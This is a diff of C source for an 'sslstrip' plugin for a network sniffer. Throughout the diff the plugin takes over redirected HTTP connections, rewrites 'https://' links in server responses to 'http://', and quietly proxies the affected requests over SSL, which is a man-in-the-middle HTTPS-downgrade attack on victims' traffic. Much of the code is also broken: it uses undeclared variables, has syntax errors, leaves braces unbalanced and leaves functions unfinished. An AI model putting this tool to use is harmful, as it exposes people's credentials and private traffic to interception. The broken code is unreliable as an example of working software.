@@ -46,6 +46,9 @@
 
 #define REQUEST_TIMEOUT 1200 /* If a request has not been used in 1200 seconds, remove it from list */
 
+#define HTTP_RETRY 5
+#define HTTP_WAIT 10
+
 #define BREAK_ON_ERROR(x,y,z) do {                      \
 	if (x == -EINVALID) {      			\
 		SAFE_FREE(z.DATA.disp_data); 		\
@@ -78,10 +81,14 @@ struct ssl_connection {
 	SSL *ssl;
 };
 
-struct http_connection {
-	int fd;
-	struct ip_addr server;
+struct http_ident {
+	u_int32 magic;
+	#define HTTP_MAGIC 0x0501e77f
+	struct ip_addr L3_src;
+	u_int16 L4_src;
+	u_int16 L4_dst;
 };
+
 
 struct http_header {
 	char name[30];
@@ -113,20 +120,28 @@ struct http_response {
 
 
 struct http_request {
-	int fd;
-	u_int16 port;
-	struct ip_addr client;
+	LIST_HEAD (, http_header) headers;	
 	char *url;
 	time_t last_used;
-	struct ssl_connection ssl_conn;
-	struct http_connection http_conn;
+        char   encrypted;
+	size_t len;
+	u_char *content;
 	//struct http_response response; - Do we need this here?
 	LIST_ENTRY(http_request) next;
 
-#define HTTP_SERVER 0
-#define HTTP_CLIENT 1
 };
 
+
+struct http_connection {
+	int32 fd[2]; /* 0->Client, 1->Server */
+	u_int16 port[2];
+	struct ip_addr ip[2];
+	struct ip_addr server;
+	#define HTTP_CLIENT 0
+	#define HTTP_SERVER 2
+	struct http_request request;
+	struct http_response response;
+};
 
 /* globals */
 static LIST_HEAD (, http_request) http_requests;
@@ -153,16 +168,22 @@ static void append_http_response(u_char *data, size_t len, struct http_response 
 static int parse_http_response(u_char *data, size_t len, struct http_response *response);
 static size_t get_content_length(struct http_response *response);
 static int find_http_response(struct ip_addr *client, struct ip_addr *server, struct http_response **response);
+static int grow_packet_object(u_char *data, size_t len, struct packet_object *po);
 
-static int http_connect_server(struct http_request *r);
-static int http_write(struct http_request *r, u_char *data, size_t packet_len);
-static int http_read(struct http_request *r, struct packet_object *po);
-static int http_wipe_connection(struct http_request *r);
+static int http_connect_server(struct http_connection *);
+static size_t http_create_ident(void **, struct packet_object *);
+static int http_sync_conn(struct http_connection *);
+static int http_replace_https(struct http_request *r, struct packet_object *po);
+static int http_get_peer(struct http_connection *);
+static int http_write(struct http_request *r, int direction, u_char *data, size_t packet_len);
+static int http_read(struct http_connection *c, int direction, u_char *data, size_t *len);
 static int http_insert_redirect(u_int16 dport);
 static int http_remove_redirect(u_int16 port);
 static void http_initialize_po(struct packet_object *po, u_char *p_data);
-static void http_parse_packet(struct http_request *request, int direction, struct packet_object *po);
-static void http_wipe_connection(struct http_request *request);
+static void http_parse_packet(struct http_connection *connection, int direction, struct packet_object *po);
+static void http_wipe_connection(struct http_connection *connection);
+static void http_handle_request(struct http_connection *connection, struct packet_object *po);
+static void http_remove_https(struct http_connection *connection, struct packet_object *po);
 
 /* thread stuff */
 static int http_bind_wrapper(void);
@@ -175,6 +196,7 @@ static int ssl_connect_server(struct http_request *r);
 static int ssl_sync_ssl(struct http_request *r);
 static int ssl_connect_ssl(SSL *ssl_sk);
 static int ssl_write(struct http_request *ssl, u_char *data, size_t packet_len);
+static int ssl_read(struct http_request *ssl, struct packet_object *po);
 static void ssl_wipe_connection(struct http_request *r);
 
 struct plugin_ops sslstrip_ops = {
@@ -218,7 +240,6 @@ static int sslstrip_init(void *dummy)
 	ec_thread_new("http_accept_thread", "wrapper for HTTP connections", &http_accept_thread, NULL);
 
 	/* add hook point in the dissector for HTTP traffic */
-	/* -- Hook point not needed */
 	//hook_add(HOOK_PROTO_HTTP, &sslstrip);
 	return PLUGIN_RUNNING;
 }
@@ -229,7 +250,7 @@ static int sslstrip_fini(void *dummy)
 
 	SSL_CTX_free(ssl_ctx_server);	
 	/* remove hook */
-	hook_del(HOOK_PROTO_HTTP, &sslstrip);
+	//hook_del(HOOK_PROTO_HTTP, &sslstrip);
 
 	http_remove_redirect(bind_port);
 
@@ -242,11 +263,6 @@ static int sslstrip_fini(void *dummy)
 	return PLUGIN_FINISHED;
 }
 
-void sslstrip_dummy(struct packet_object *po)
-{
-	/* The main plugin function should not run as the hook point will never
-         * be executed since this plugin will redirect HTTP traffic to itself */
-}
 void sslstrip(struct packet_object *po)
 {
 	struct http_request *r;
@@ -269,12 +285,17 @@ void sslstrip(struct packet_object *po)
 				/* Let's set the packet to be dropped, this way it won't be sent to port 80 of the server */
 				po->flags |= PO_DROPPED;
 				
-				if (ssl_sync_conn(r) != ESUCCESS)
+				if (ssl_sync_conn(r) != ESUCCESS) {
+					DEBUG_MSG("Failed to connect to HTTPs server");
 					return;
+				}
 		
 				/* Now that we've established a HTTP connection with the server, send request */
 				if(ssl_write(r, po->DATA.data, po->DATA.len) != ESUCCESS)
 					DEBUG_MSG("Could not write SSL request");
+
+				/* Read SSL response and send it back to client */
+				
 
 				/* Wipe SSL connection */
 				ssl_wipe_connection(r);
@@ -620,6 +641,33 @@ static int ssl_write(struct http_request *r, u_char *data, size_t packet_len)
 	return ESUCCESS;
 }
 
+static int ssl_read(struct http_request *r, struct packet_object *po)
+{
+	int len, ret_err;
+	
+	len = SSL_read(r->ssl_conn.ssl, po->DATA.data, 1024);
+
+	if (len <= 0) {
+		ret_err = SSL_get_error(r->ssl_conn.ssl, len);
+
+		if (ret_err == SSL_ERROR_WANT_READ || ret_err == SSL_ERROR_WANT_WRITE)
+			return -ENOTHANDLED;
+		else
+			return -EINVALID;
+	}
+
+	po->len = len;
+	po->DATA.len = len;
+	po->L4.flags |= TH_PSH;
+
+	po->DATA.data[po->DATA.len] = 0;
+	packet_destroy_object(po);
+	packet_disp_data(po, po->DATA.data po->DATA.len);
+
+	return ESUCCESS;
+
+}
+
 static void ssl_wipe_connection(struct http_request *r)
 {
 	if (r->ssl_conn.ssl)
@@ -888,7 +936,7 @@ static int http_remove_redirect(u_int16 port)
 
 static int http_accept_thread(void)
 {
-	struct http_request *request;
+	struct http_connection *connection = NULL;
 	u_int len = sizeof(struct sockaddr_in), i;
 	struct sockaddr_in client_sin;
 
@@ -901,30 +949,140 @@ static int http_accept_thread(void)
 
 	LOOP {
 		poll(poll_fd, 1, -1);
-		SAFE_CALLOC(request, 1, sizeof(struct http_request));
-		request->fd = accept(poll_fd.fd, (struct sockaddr *)&client_sin, &len);
+		SAFE_CALLOC(connection, 1, sizeof(struct http_connection));
+		connection->fd[HTTP_CLIENT]= accept(poll_fd.fd, (struct sockaddr *)&client_sin, &len);
 
 		if (request->fd == -1) {
 			SAFE_FREE(request);
 			continue;
 		}
 
-		ip_addr_init(&request->client, AF_INET, (char *)&(client_sin.sin_addr.s_addr));
-		request->port = client_sin.sin_port;
+		ip_addr_init(&connection->ip[HTTP_CLIENT], AF_INET, (char *)&(client_sin.sin_addr.s_addr));
+		connection->port[HTTP_CLIENT] = client_sin.sin_port;
+		connection->port[HTTP_SERVER] = htons(80);
 
 		/* create detached thread */
-		ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, request, 1);	
-	}
+		ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, connection, 1);	
 
 	return NULL;
 }
 
+static int http_get_peer(struct http_connection *connection)
+{
+	struct ec_session *s = NULL;
+	struct packet_object po;
+	void *ident= NULL;
+	int i;
+
+	memcpy(&po.L3.src, &connection->ip[HTTP_CLIENT], sizeof(struct ip_addr));
+	po.L4.src = connection->port[HTTP_CLIENT];
+	po.L4.dst = connection->port[HTTP_SERVER]; 
+
+	http_create_ident(&ident, &po);
+
+#ifndef OS_WINDOWS
+	struct timespec tm;
+	tm.tv_sec = HTTP_WAIT;
+	tv.tv_nsec = 0;
+#endif
+
+	/* Wait for sniffing thread */
+	for (i=0; i<HTTP_RETRY && session_get_and_del(&s, ident, HTTP_IDENT_LEN)!=ESUCCESS; i++)
+#ifndef OS_WINDOWS
+	nanosleep(&tm, NULL);
+#else	
+	usleep(HTTP_WAIT);
+#endif
+
+	if (i==HTTP_RETRY) {
+		SAFE_FREE(ident);
+		return -EINVALID;
+	}
+
+	memcpy(&connection->ip[HTTP_SERVER], s->data, sizeof(struct ip_addr));
+	
+	SAFE_FREE(s->data);
+	SAFE_FREE(s);
+	SAFE_FREE(ident);
+
+	return ESUCCESS;
+
+}
+
+
+static size_t http_create_ident(void **i, struct packet_object *po)
+{
+	struct http_ident *ident;
+
+	SAFE_CALLOC(ident, 1, sizeof(struct http_ident));
+
+	ident->magic = HTTP_MAGIC;
+
+	memcpy(&ident->L3_src, &po->L3.src, sizeof(struct ip_addr));
+	ident->L4_src = po->L4.src;
+	ident->L4_dst = po->L4.dst;
+
+	/* return the ident */
+	*i = ident;
+	return sizeof(struct http_ident);
+}
+static http_sync_conn(struct http_connection *connection) 
+{
+	if (http_get_peer(connection) != ESUCCESS)
+		return -EINVALID;
+
+	if (http_connect_server(request) != ESUCCESS)
+		return -EINVALID;
+
+	set_blocking(request->fd, 0);
+	set_blocking(request->http_conn->fd, 0);
+
+	return ESUCCESS;
+}
+
+static int http_connect_server(struct http_connection *connection)
+{
+	char *dest_ip;
+	dest_ip = strdup(int_ntoa(ip_addr_to_int32(connection->ip[HTTP_SERVER].addr)));
+
+	if (!dest_ip || connection->fd[HTTP_SERVER] = open_socket(dest_ip, ntohs(connection->port[HTTP_SERVER])) < 0) {
+		SAFE_FREE(dest_ip);
+		DEBUG_MSG("Could not open socket");
+		return -EINVALID;	
+	}
+
+	SAFE_FREE(dest_ip);
+	return ESUCCESS;
+}
+
+static int http_read(struct http_connect *connection, int direction, u_char *data, size_t *len)
+{
+	int len, ret_err;
+
+	if (buffer==NULL)
+		return -EINVALID;
+
+	*len = read(connection->fd[direction], data, 1024);
+
+	if (*len < 0) {
+		int err = GET_SOCK_ERRNO();
+		if (err == EINTR || err == EAGAIN)
+			return -ENOTHANDLED;
+		else
+			return -EINVALID;
+	}
+
+	if (*len == 0)
+		return -EINVALID;
+
+	return ESUCCESS;
+}
 
 EC_THREAD_FUNC(http_child_thread)
 {
 	struct packet_object po;
 	int direction, ret_val, data_read;
-	struct http_request *request;
+	struct http_connection *connection;
 #ifndef OS_WINDOWS
 	struct timespec tm;
 	tm.tv_sec = 0;
@@ -933,14 +1091,16 @@ EC_THREAD_FUNC(http_child_thread)
 	int timeout = 3000;
 #endif
 
-	request = (struct http_request *)args;
+	connection = (struct http_connection *)args;
 	ec_thread_init();
 
+	connection->fd[HTTP_SERVER] = -1; //Don't want to close STDIN
+
 	/* Connect to real HTTP server */
-	if (http_connect_server(request) == -EINVALID) {
-		if(request->fd != -1)
-			close_socket(request->fd);
-		SAFE_FREE(request);
+	if (http_sync_conn(request) == -EINVALID) {
+		if (connection->fd[HTTP_CLIENT] != -1)
+			close_socket(connection->fd[HTTP_CLIENT]);
+		SAFE_FREE(connection);	
 		ec_thread_exit();
 	}
 
@@ -951,60 +1111,259 @@ EC_THREAD_FUNC(http_child_thread)
 	po.L4.flags = (TH_SYN | TH_ACK);
 	packet_disp_data(&po, po.DATA.data, po.DATA.len);
 	http_initialize_po(&po, po.DATA.data);
+	u_char *data = NULL;
+	size_t len = 0;
+
+	data = (u_char *)malloc(1024);
+	
+	if (!data){
+		SAFE_FREE(connection);
+		ec_thread_exit();
+	}	
+
+	data_read = 0;
 
 	LOOP {
-		data_read = 0;
-		for(direction=0;direction<2;direction++) {
-			ret_val = http_read(request, &po);
 
-			BREAK_ON_ERROR(ret_val, request, po);
-
-			/* if we have data to read */
-			if (ret_val = ESUCCESS) {
+		do { 
+			ret_val = http_read(connection, direction, data, &len);
+			
+			if (ret_val == ESUCCESS) {
 				data_read = 1;
-				http_parse_packet(request, direction, &po);
-				if (po.flags & PO_DROPPED)
-					continue;
-
-				/* Parse HTTP response */
-				ret_val = http_write(request, !direction, &po);
-				BREAK_ON_ERROR(ret_val, request, po);
-
-				http_initialize_po(&po, po.DATA.data);
+				grow_packet_object(data, len, &po);
 			}
-		}
+		} while (ret_val != -EINVALID);
 
-		if (!data_read)
-#ifdef OS_WINDOWS
-			usleep(timeout);
-#else
-			nanosleep(&tm, NULL);
-#endif
+		//We read the entire request/response
+
+		BREAK_ON_ERROR(ret_val, connection, po);
+
+		/* if we read data, write it to real server */
+		if (data_read) {
+			/* We got a response, change https with http */
+			if (direction) {
+				http_remove_https(connection, &po);
+			} else {
+				/* Look for request and if it matches a HTTPs link, send it to SSL server */
+				http_handle_request(connection, &po);
+			}
+
+			//response->body has the new body
+
+			http_parse_packet(connection, direction, &po);
+
+			if (po.flags & PO_DROPPED)
+				continue;
+
+			ret_val = http_write(connection, !direction, &po);
+			BREAK_ON_ERROR(ret_val, connection, po);
+
+			http_initialize_po(&po, po.DATA.data);
+		}
+		
 	}
 
 	return NULL;
 	
 }
 
-static void http_parse_packet(struct http_request *request, struct packet_object *po)
+
+static int grow_packet_object(u_char *data, size_t len, struct packet_object *po)
+{
+	u_char *d = po->DATA.data;
+	size_t current = po->DATA.len;
+	u_char *new;
+
+	new = (u_char *)realloc(po->DATA.data, current+len);
+
+	if (new == d) //failed to realloc
+		return -EINVALID;
+
+	//Copy data to newly created space
+	memcpy(new, data, len);
+}
+
+static void http_handle_request(struct http_connection *connection, struct packet_object *po)
+{
+	char *url;
+		
+	SAFE_CALLOC(url, 1, 128);
+
+	memset(url, '\0', 128);
+
+	Find_Url(po->DATA.data, &url);
+
+ 	LIST_FOREACH(r, &http_requests, next) {
+        	if(!strcmp(r->url, url) && ip_addr_cmp(&connection->ip[HTTP_CLIENT], &po->L3.src) == 0) {
+                                DEBUG_MSG("SSLStrip: Found request in list");
+                                /* Found URL in list, must make HTTPS request instead of HTTP */
+
+                                /* Let's set the packet to be dropped, this way it won't be sent to port 80 of the server */
+                                po->flags |= PO_DROPPED;
+
+                                if (ssl_sync_conn(r) != ESUCCESS) {
+                                        DEBUG_MSG("Failed to connect to HTTPs server");
+                                        return;
+                                }
+
+                                /* Now that we've established a HTTP connection with the server, send request */
+                                if(ssl_write(r, po->DATA.data, po->DATA.len) != ESUCCESS)
+                                        DEBUG_MSG("Could not write SSL request");
+
+                                /* Read SSL response and send it back to client */
+				//copy response to po
+
+                                /* Wipe SSL connection */
+                                ssl_wipe_connection(r);
+
+                                /* Update the last used timestamp of the request */
+                                r->last_used = time(NULL);
+
+                                /* So the response should come to us via the normal channels -> dissector -> plugin */
+                                break;
+                        }
+
+		}
+	}
+
+	SAFE_FREE(url);
+}
+
+static void http_remove_https(struct http_connection *connection, struct packet_object *po)
+{
+	struct http_response response = connection->response;	
+
+	if (parse_http_response(po->DATA.data, po->DATA.len, &response) == HTTP_ERROR) {
+		DEBUG_MSG("Error parsing HTTP response");
+		return;
+	}
+
+	response->client = connection->ip[HTTP_CLIENT];
+	response->server = connection->ip[HTTP_SERVER];
+
+        /* 
+         * Check and see if response is compressed with gzip or deflate, if so deflate 
+        */
+        if (response->compressed) {
+        	u_char *decompressed;
+                SAFE_CALLOC(decompressed, 1, 131640);
+                DEBUG_MSG("DECOMPRESSING");
+                if (decompress(response->body, response->received, response->comp_method, &decompressed) != ESUCCESS) {
+                	DEBUG_MSG("DECOMPRESS FAILED");
+                        SAFE_FREE(decompressed);
+                        LIST_REMOVE(response, next);
+                        SAFE_FREE(response->body);
+                        SAFE_FREE(response);
+                        return;
+                }
+
+               response->body = (u_char *)strdup((char *)decompressed);
+               response->content_length = strlen((char *)decompressed);
+               SAFE_FREE(decompressed);
+       }
+
+       u_int8 *ptr, *tmp;
+       u_int8 *end;
+       size_t len;
+       size_t slen = strlen("https://");
+       char *pattern = "https://";
+       char *with = "http://";
+       size_t with_len = strlen(with);
+
+       /* If no HTTPS links were found, return and do not add to list */
+       if (!memmem(response->body, response->content_length, pattern, slen)) {
+	       DEBUG_MSG("SSLStrip: Pattern not found");
+               LIST_REMOVE(response, next);
+               SAFE_FREE(response->body);
+               SAFE_FREE(response);
+               return;
+       }
+
+       DEBUG_MSG("SSLStrip: Found https");
+       ptr = response->body;
+       end = ptr + response->content_length;
+
+       do {
+	       len = end - ptr;
+               ptr = memmem(ptr, len, pattern, slen);
+
+
+                if (!ptr) /* String not found, exit */
+    	       		break;
+
+                 /* Determine URL to add to list */
+                 //ptr is at http
+                 tmp = ptr;
+                 tmp += slen;
+
+                 u_int8 *link_end=(u_int8 *)strchr((const char*)tmp, '"');
+                 link_end--;
+
+                 u_int8 *url = (u_int8 *)(link_end -tmp);
+
+                 SAFE_CALLOC(r, 1, sizeof(struct http_request));
+
+                 r->client = po->L3.dst;
+                 r->ssl_conn.server = po->L3.src;
+
+                 r->url = (char *)url;
+                 r->last_used = time(NULL);
+
+                 //Add to list
+                 LIST_INSERT_HEAD(&http_requests, r, next);
+
+                 //Continue to modify packet
+
+                 len = end - ptr - slen;
+                 po->DATA.delta += with_len - slen;
+                 po->DATA.len += with_len - slen;
+
+                 memmove(ptr + with_len, ptr + slen, len);
+                 memcpy(ptr, with, with_len);
+                 ptr += with_len;
+
+                 end += with_len - slen;
+
+                 /* mark packet as modified */
+                 po->flags |= PO_MODIFIED;
+        } while (ptr != NULL && ptr < end);
+
+	/* reinitialize packet_object with the new data */
+	http_initialize_po(&po, po.DATA.data);
+
+	struct http_header *header;
+
+ 	LIST_FOREACH(header, &response->headers, next) {
+	}
+
+        /* Remove the http_response from the list since we already processed it */
+        LIST_REMOVE(response, next);
+        SAFE_FREE(response->body);
+        SAFE_FREE(response);
+
+
+        /* Iterate through all http_request and remove any that have not been used lately */
+        struct http_request *tmp;
+        time_t now = time(NULL);
+
+        LIST_FOREACH_SAFE(r, &http_requests, next, tmp) {
+                if(now - r->last_used >= REQUEST_TIMEOUT) {
+                        LIST_REMOVE(r, next);
+                        SAFE_FREE(r);
+                }
+        }
+}
+
+static void http_parse_packet(struct http_connection *connection, int direction, struct packet_object *po)
 {
 	FUNC_DECODER_PTR(start_decoder);
 	int len;
 
-	if (direction == HTTP_CLIENT) {
-
-		memcpy(&po->L3.src, &request->client, sizeof(struct ip_addr));
-		memcpy(&po->L3.dst, &request->conn.server, sizeof(struct ip_addr));
+	memcpy(&po->L3.src, &connection->ip[direction], sizeof(struct ip_addr));
+	memcpy(&po->L3.dst, &connection->ip[!direction], sizeof(struct ip_addr));
 	
-		po->L4.src = request->port;
-		po->L4.dst = htons(80);
-	} else {
-		memcpy(&po->L3.src, &request->conn.server, sizeof(struct ip_addr));
-		memcpy(&po->L3.dst, &request->client, sizeof(struct ip_addr));
-
-		po->L4.src = htons(80);
-		po->L4.dst = request->port;
-	}
+	po->L4.src = connection->port[direction];
+	po->L4.dst = connection->port[!direction];
 	
 	/* get time */
 	gettimeofday(&po->ts, NULL);
@@ -1035,6 +1394,9 @@ static void http_initialize_po(struct packet_object *po, u_char *p_data)
     * fake headers. Headers len is set to 0.
     * XXX - Be sure to not modify these len.
     */
+
+   SAFE_FREE(po->DATA.data);
+
    memset(po, 0, sizeof(struct packet_object));
    if (p_data == NULL) {
       SAFE_CALLOC(po->DATA.data, 1, UINT16_MAX);
@@ -1088,6 +1450,15 @@ static int http_bind_wrapper(void)
 
 	return ESUCCESS;
 
+}
+
+static void http_wipe_connection(struct http_connection *connection)
+{
+	close_socket(connection->fd[HTTP_CLIENT]);
+	close_socket(connection->fd[HTTP_SERVER]);
+
+	if (connection)
+		SAFE_FREE(connection);
 }
 
 /* GZIP/Deflate decompress */
